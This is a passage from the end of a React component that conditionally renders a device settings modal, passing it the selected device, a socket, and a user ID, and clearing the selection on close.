            {settingsDevice && (
                <DeviceSettingsModal
                    device={settingsDevice}
                    socket={socket}
                    userUuid={userUuid || ''}
                    onClose={() => setSettingsDevice(null)}
                />
            )}
        </>
    );
}
